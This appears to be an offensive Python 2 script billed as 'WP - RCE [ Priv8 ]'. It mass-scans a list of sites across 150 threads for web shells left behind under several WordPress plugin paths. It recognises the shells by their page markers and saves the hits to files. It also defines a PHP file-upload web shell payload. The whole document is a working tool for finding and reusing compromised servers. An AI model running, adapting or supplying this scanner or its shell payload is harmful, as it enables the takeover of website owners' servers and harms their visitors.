# -*-coding:Latin-1 -*
import sys , requests, re
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA


print """
WP - RCE [ Priv8 ]
- wordpresss3cll
- anttt
- TOPXOH
- wp-file-upload
"""
shell = """<?php echo "Raiz0WorM"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>"""
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def FourHundredThree(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/anttt/simple.php',headers=headers, allow_redirects=True,timeout=15)
        if 'input type="file" id="inputfile" name="inputfile"' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('simple.txt', 'a').write(url + '/wp-content/plugins/anttt/simple.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/TOPXOH/wDR.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('wso.txt', 'a').write(url + '/wp-content/plugins/TOPXOH/wDR.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/wordpresss3cll/up.php',headers=headers, allow_redirects=True,timeout=15)
        if 'enctype="multipart/form-data"><input type="file" name="btul"><button>Gaskan<' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('GaskanShells.txt', 'a').write(url + '/wp-content/plugins/wordpresss3cll/up.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/wp-file-upload/ROOBOTS.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Upl0od Your T0ols' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('ROOBOTS.txt', 'a').write(url + '/wp-content/plugins/wp-file-upload/ROOBOTS.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)

mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

print '\n [!] {}Saved in Shells.txt'.format(fc)